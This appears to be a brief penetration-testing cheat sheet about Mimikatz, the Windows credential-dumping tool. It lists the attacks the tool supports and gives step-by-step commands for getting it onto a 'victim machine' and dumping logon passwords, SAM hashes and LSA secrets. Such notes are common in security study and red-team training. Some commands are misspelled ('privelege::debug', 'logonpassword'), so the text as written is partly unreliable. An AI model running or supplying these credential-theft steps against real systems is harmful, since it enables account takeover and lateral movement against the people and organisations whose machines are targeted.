# Mimikatz Overview

## Github Link

* [https://github.com/gentilkiwi/mimikatz](https://github.com/gentilkiwi/mimikatz)[https://github.com/gentilkiwi/mimikatz/wiki/](https://github.com/gentilkiwi/mimikatz/wiki/)

## What is Mimikatz

* tool used to view and steal credentials, generate Kerberos tickets, and leverage attacks
* dump credentials stored in memory
* cred dumping, pass-the-hash, over-pass-the-hash, pass-the-ticket, golden ticket, silver ticket, etc

## Credential Dumping with Mimikatz

### Step 1: Get Mimikatz on the Victim Machine

* use any exfiltration method
* advanced techniques may be required

### Step 2: Run Mimikatz and Command to Allow Debugging Restricted Process

```bash
privelege::debug
```

### Step 3: Compromise User Hashes

```bash
sekurlsa::logonpassword
```

* can also get wdigest \(which stores password in clear text\) but we need to turn feature on with tool\)

### Step 4: Try to Dump SAM

```bash
lsadump::sam
lsadump::sam /patch
```

### Step 5: Get User and NTLM Another Way \(Crack Them and Pass the Hash\)

```bash
lsadump::lsa /patch
```

